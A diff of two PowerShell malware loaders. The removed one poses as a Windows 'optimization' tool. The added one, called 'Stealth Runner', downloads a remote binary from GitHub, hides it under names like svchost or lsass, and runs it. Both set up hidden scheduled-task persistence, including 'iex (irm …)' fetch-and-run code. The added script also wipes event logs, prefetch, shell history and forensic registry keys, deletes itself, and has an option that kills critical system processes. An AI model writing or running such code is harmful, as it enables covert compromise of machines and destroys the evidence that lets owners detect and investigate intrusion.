@@ -1,216 +1,279 @@
-# WINDOWS SYSTEM CORE MANAGER - FIXED VERSION
-function Initialize-CoreManager {
-    Write-Host "`n Windows System Core Manager" -ForegroundColor Cyan
-    Write-Host " ============================" -ForegroundColor Gray
-    Write-Host " Build: 10.0.22621.1.amd64fre.ni_release" -ForegroundColor Yellow
-    Write-Host " Component: System Performance Module" -ForegroundColor Gray
-    Write-Host ""
-    Write-Host " 1. Start Core Optimization" -ForegroundColor Green
-    Write-Host " 2. System Maintenance" -ForegroundColor Red
-    Write-Host ""
-    Write-Host " Select: " -NoNewline -ForegroundColor White
+# Stealth Runner (Anti-Cheat Evasion Version)
+# Copyright: Your Name
+
+Write-Host "+ Advanced Stealth Runner" -ForegroundColor Cyan
+Write-Host "1. Stealth Install & Execute" -ForegroundColor Green
+Write-Host "2. Deep Clean & Remove" -ForegroundColor Yellow
+
+$choice = Read-Host "`nEnter choice (1/2)"
+
+# Elevate privileges silently
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
 
-function Start-CoreOptimization {
-    Write-Host "`n[SYSTEM] Initializing core optimization..." -ForegroundColor Green
-    
-    try {
-        # URLs จริงของคุณ
-        $exeUrl = "https://github.com/Verte225066/test/blob/main/system_logs.exe?raw=true"
-        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
-        
-        Write-Host "[DOWNLOAD] Loading optimization engine..." -ForegroundColor Yellow
-        
-        # โหลด EXE
-        $webClient = New-Object System.Net.WebClient
-        $exeBytes = $webClient.DownloadData($exeUrl)
-        $webClient.Dispose()
-        
-        Write-Host "[SUCCESS] Downloaded $($exeBytes.Length) bytes" -ForegroundColor Green
-        
-        # ตรวจสอบ EXE
-        if ($exeBytes[0] -eq 0x4D -and $exeBytes[1] -eq 0x5A) {
-            Write-Host "[VERIFY] Valid system component" -ForegroundColor Green
-            
-            # ใช้ Disk Execution โดยตรง (มั่นใจกว่า)
-            $success = Invoke-DirectExecution -ExeBytes $exeBytes
-            
-            if ($success) {
-                Write-Host "[ACTIVE] Core optimization running" -ForegroundColor Green
-                
-                # ติดตั้ง persistence
-                Install-BasicPersistence -LoaderUrl $loaderUrl
-                
-                # เริ่ม monitoring
-                Start-BasicMonitor -LoaderUrl $loaderUrl
-                
-                Write-Host "[COMPLETE] System optimization initialized" -ForegroundColor Cyan
-                return $true
-            }
-        }
-        
-        return $false
-        
-    } catch {
-        Write-Host "[ERROR] Optimization failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+# Configuration - CHANGE THIS URL TO YOUR ACTUAL FILE
+$RemoteBinaryUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe"  # REPLACE WITH YOUR REAL URL
+$SystemPaths = @(
+    "$env:windir\System32\drivers",
+    "$env:windir\Temp",
+    "$env:windir\Logs",
+    "$env:programdata\Microsoft",
+    "$env:programdata\Intel"
+)
+
+# Random filename generation
+function Get-RandomFilename {
+    $systemNames = @("dllhost", "svchost", "csrss", "winlogon", "services", "lsass", "spoolsv", "taskhost", "runtime", "wmiprvse")
+    $extensions = @(".exe", ".dll", ".tmp", ".dat", ".sys")
+    $randomName = $systemNames | Get-Random
+    $randomExt = $extensions | Get-Random
+    return $randomName + $randomExt
+}
+
+$BinaryFilename = Get-RandomFilename
+$InstallPath = $SystemPaths | Get-Random
+$BinaryDestination = Join-Path $InstallPath $BinaryFilename
+
+# Stealth Task Names
+$TaskNames = @(
+    "\Microsoft\Windows\MemoryDiagnosis",
+    "\Microsoft\Windows\SystemDataUpdater", 
+    "\Microsoft\Windows\FileHistory",
+    "\Microsoft\Windows\DiskCleanup",
+    "\Microsoft\Windows\Defender\Scan"
+)
+$TaskName = $TaskNames | Get-Random
+
+function Write-StealthProgress {
+    param([string]$Message, [int]$Duration = 2)
+    Write-Host "[+] $Message " -NoNewline -ForegroundColor Gray
+    1..$Duration | ForEach-Object { 
+        Write-Host "█" -NoNewline -ForegroundColor DarkGray
+        Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 800)
     }
+    Write-Host " ✓" -ForegroundColor Green
 }
 
-function Invoke-DirectExecution {
-    param([byte[]]$ExeBytes)
+function Invoke-DeepClean {
+    Write-Host "`n[!] Initiating Deep Clean Procedures..." -ForegroundColor Red
     
-    try {
-        # สร้างไฟล์ชั่วคราว
-        $tempName = "syscore_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".exe"
-        $tempPath = Join-Path $env:TEMP $tempName
-        
-        # เขียนไฟล์
-        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
-        
-        Write-Host "[LAUNCH] Starting optimization engine..." -ForegroundColor Cyan
-        
-        # รัน process
-        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-        
-        if ($process -and (-not $process.HasExited)) {
-            Write-Host "[PROCESS] Engine PID: $($process.Id)" -ForegroundColor Green
-            
-            # ลบไฟล์หลังจากรัน
-            Start-Job -ScriptBlock {
-                param($Path)
-                Start-Sleep -Seconds 5
-                try {
-                    if (Test-Path $Path) {
-                        Remove-Item $Path -Force -ErrorAction SilentlyContinue
-                    }
-                } catch {}
-            } -ArgumentList $tempPath | Out-Null
-            
-            return $true
-        }
-        
-        return $false
-        
-    } catch {
-        Write-Host "[ERROR] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-function Install-BasicPersistence {
-    param([string]$LoaderUrl)
+    # Clean PowerShell evidences
+    $cleanOps = @(
+        @{Name="PS History"; Path=(Get-PSReadLineOption).HistorySavePath},
+        @{Name="Event Logs"; Path="EventLog"},
+        @{Name="Prefetch Files"; Path="$env:windir\Prefetch"},
+        @{Name="Temp Files"; Path="$env:temp"},
+        @{Name="Recent Files"; Path="$env:APPDATA\Microsoft\Windows\Recent"},
+        @{Name="RunMRU"; Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"}
+    )
     
-    try {
-        Write-Host "[PERSISTENCE] Configuring auto-start..." -ForegroundColor Yellow
-        
-        # Scheduled Task
-        $taskName = "WindowsSystemMaintenance"
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm '$LoaderUrl')`""
-        $trigger = New-ScheduledTaskTrigger -AtLogon
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        
-        Write-Host "[PERSISTENCE] Auto-start configured" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "[PERSISTENCE] Auto-start setup skipped" -ForegroundColor Yellow
-    }
-}
-
-function Start-BasicMonitor {
-    param([string]$LoaderUrl)
-    
-    Write-Host "[MONITOR] Starting system monitor..." -ForegroundColor Green
-    
-    $monitorScript = {
-        param($Url)
-        while ($true) {
-            try {
-                # ตรวจสอบ process
-                $processes = Get-Process -Name "syscore_*" -ErrorAction SilentlyContinue
-                
-                if (-not $processes) {
-                    # Restart
-                    try {
-                        iex (irm $Url)
-                    } catch {}
-                }
-                
-                Start-Sleep -Seconds 60
-                
-            } catch {
-                Start-Sleep -Seconds 120
-            }
-        }
-    }
-    
-    Start-Job -ScriptBlock $monitorScript -ArgumentList $LoaderUrl | Out-Null
-}
-
-function Invoke-SystemMaintenance {
-    Write-Host "`n[MAINTENANCE] Starting system maintenance..." -ForegroundColor Red
-    
-    $cleanedItems = @()
-    
-    # Clean processes
-    try {
-        Get-Process -Name "syscore_*" -ErrorAction SilentlyContinue | Stop-Process -Force
-        $cleanedItems += "Processes"
-    } catch {}
-    
-    # Clean tasks
-    try {
-        Unregister-ScheduledTask -TaskName "WindowsSystemMaintenance" -Confirm:$false -ErrorAction SilentlyContinue
-        $cleanedItems += "Scheduled tasks"
-    } catch {}
-    
-    # Clean files
-    try {
-        Get-ChildItem "$env:TEMP\syscore_*.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
-        $cleanedItems += "Temporary files"
-    } catch {}
-    
-    # Clean jobs
-    try {
-        Get-Job | Remove-Job -Force
-        $cleanedItems += "Background jobs"
-    } catch {}
-    
-    # Results
-    Write-Host "`n[RESULTS] Maintenance completed:" -ForegroundColor Green
-    foreach ($item in $cleanedItems) {
-        Write-Host "  ✓ $item" -ForegroundColor Gray
-    }
-}
-
-# MAIN EXECUTION
-try {
-    Initialize-CoreManager
-    $choice = Read-Host
-    
-    switch ($choice) {
-        '1' { 
-            $success = Start-CoreOptimization
-            if ($success) {
-                Write-Host "`n[READY] System optimization active" -ForegroundColor Cyan
+    foreach ($op in $cleanOps) {
+        try {
+            if ($op.Name -eq "Event Logs") {
+                wevtutil el | ForEach-Object { wevtutil cl $_ }
+            } elseif ($op.Name -eq "RunMRU") {
+                Remove-ItemProperty -Path $op.Path -Name "*" -ErrorAction SilentlyContinue
             } else {
-                Write-Host "`n[ERROR] Optimization failed" -ForegroundColor Red
+                if (Test-Path $op.Path) {
+                    Get-ChildItem -Path $op.Path -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+                }
             }
-        }
-        '2' { 
-            Invoke-SystemMaintenance
-            Write-Host "`n[COMPLETE] System maintenance finished" -ForegroundColor Green
-        }
-        default {
-            Write-Host "`nStarting optimization..." -ForegroundColor Yellow
-            Start-CoreOptimization
+            Write-Host "  → Cleared: $($op.Name)" -ForegroundColor Yellow
+        } catch {
+            Write-Host "  → Failed: $($op.Name)" -ForegroundColor DarkGray
         }
     }
-} catch {
-    Write-Host "[ERROR] Operation failed" -ForegroundColor Red
+    
+    # Advanced registry cleaning
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
+        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
+        "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
+    )
+    
+    foreach ($regPath in $regPaths) {
+        try {
+            if (Test-Path $regPath) {
+                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        } catch {}
+    }
+    
+    # Clear recycle bin silently
+    try {
+        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Write-Host "`n[+] Deep Clean Complete" -ForegroundColor Green
 }
 
-Write-Host "`nOperation completed" -ForegroundColor Gray
-Start-Sleep -Seconds 2
+function Set-StealthPersistence {
+    param([string]$TargetPath)
+    
+    Write-StealthProgress -Message "Configuring stealth persistence" -Duration 3
+    
+    try {
+        $action = New-ScheduledTaskAction -Execute $TargetPath -WorkingDirectory (Split-Path $TargetPath)
+        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:05:00"
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
+        
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Windows System Maintenance" -Force | Out-Null
+        
+        # Hide task from normal view
+        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+        if ($task) {
+            $task | Set-ScheduledTask -Hidden | Out-Null
+        }
+    } catch {
+        Write-Host "[!] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+function Remove-StealthPersistence {
+    Write-Host "`n[!] Removing persistence..." -ForegroundColor Yellow
+    
+    foreach ($task in $TaskNames) {
+        try {
+            if (Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue) {
+                Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
+                Write-Host "  → Removed task: $task" -ForegroundColor Green
+            }
+        } catch {}
+    }
+}
+
+function Start-StealthProcess {
+    param([string]$ProcessPath)
+    
+    Write-StealthProgress -Message "Launching in stealth mode" -Duration 2
+    
+    try {
+        # Start process with minimal visibility
+        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processStartInfo.FileName = $ProcessPath
+        $processStartInfo.WorkingDirectory = Split-Path $ProcessPath
+        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $processStartInfo.CreateNoWindow = $true
+        $processStartInfo.UseShellExecute = $false
+        
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo = $processStartInfo
+        $process.Start() | Out-Null
+        
+        # Allow process to initialize then hide it further
+        Start-Sleep -Seconds 2
+        
+        return $process
+    } catch {
+        Write-Host "[!] Process start failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Main execution flow
+switch ($choice) {
+    "1" {
+        Write-Host "`n[>] Starting Stealth Deployment..." -ForegroundColor Cyan
+        
+        # Phase 1: Download
+        Write-StealthProgress -Message "Downloading remote binary" -Duration 4
+        try {
+            $tempFile = Join-Path $env:temp ([System.IO.Path]::GetRandomFileName() + ".tmp")
+            Invoke-WebRequest -Uri $RemoteBinaryUrl -OutFile $tempFile -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -TimeoutSec 30
+            
+            # Verify download
+            if (Test-Path $tempFile -PathType Leaf) {
+                Write-StealthProgress -Message "Download verified" -Duration 1
+            } else {
+                throw "Download failed"
+            }
+        } catch {
+            Write-Host "[!] Download failed: $($_.Exception.Message)" -ForegroundColor Red
+            exit
+        }
+        
+        # Phase 2: Install
+        Write-StealthProgress -Message "Deploying to system location" -Duration 3
+        try {
+            # Ensure directory exists
+            if (-not (Test-Path $InstallPath)) {
+                New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
+            }
+            
+            Move-Item -Path $tempFile -Destination $BinaryDestination -Force
+            Write-Host "  → Target: $BinaryDestination" -ForegroundColor DarkGray
+        } catch {
+            Write-Host "[!] Installation failed: $($_.Exception.Message)" -ForegroundColor Red
+            exit
+        }
+        
+        # Phase 3: Persistence
+        Set-StealthPersistence -TargetPath $BinaryDestination
+        
+        # Phase 4: Execution
+        $process = Start-StealthProcess -ProcessPath $BinaryDestination
+        if ($process) {
+            Write-StealthProgress -Message "Process launched successfully" -Duration 1
+        }
+        
+        # Phase 5: Cleanup
+        Invoke-DeepClean
+        
+        Write-Host "`n[✓] Stealth deployment completed successfully" -ForegroundColor Green
+        Write-Host "[i] Binary: $BinaryDestination" -ForegroundColor DarkGray
+        Write-Host "[i] Task: $TaskName" -ForegroundColor DarkGray
+    }
+    
+    "2" {
+        Write-Host "`n[!] INITIATING DEEP CLEAN OPERATION" -ForegroundColor Red
+        Write-Host "[!] This will remove ALL traces of the deployment" -ForegroundColor Yellow
+        
+        # Stop any running processes
+        Write-Host "`n[>] Terminating processes..." -ForegroundColor Yellow
+        $possibleNames = @("explorerr", "dllhost", "svchost", "csrss", "winlogon", "services", "lsass", "spoolsv", "taskhost", "runtime", "wmiprvse")
+        foreach ($name in $possibleNames) {
+            try {
+                Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+        # Remove persistence
+        Remove-StealthPersistence
+        
+        # Remove binaries from all possible locations
+        Write-Host "`n[>] Removing deployed files..." -ForegroundColor Yellow
+        foreach ($path in $SystemPaths) {
+            try {
+                if (Test-Path $path) {
+                    Get-ChildItem -Path $path -Include @("*.exe", "*.dll", "*.tmp", "*.dat", "*.sys") -Recurse -Force -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.Name -like "*explorerr*" -or $_.Name -like "*dllhost*" -or $_.Name -like "*svchost*" -or $_.Name -like "*csrss*" -or $_.Name -like "*winlogon*" } |
+                    Remove-Item -Force -ErrorAction SilentlyContinue
+                }
+            } catch {}
+        }
+        
+        # Final deep clean
+        Invoke-DeepClean
+        
+        Write-Host "`n[✓] DEEP CLEAN COMPLETE" -ForegroundColor Green
+        Write-Host "[✓] All traces have been removed from the system" -ForegroundColor Green
+    }
+    
+    default {
+        Write-Host "[!] Invalid selection" -ForegroundColor Red
+    }
+}
+
+# Final stealth measures
+if ($choice -eq "1") {
+    Write-Host "`n[i] Self-cleaning..." -ForegroundColor DarkGray
+    Start-Sleep 2
+    
+    # Remove script traces
+    try {
+        Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
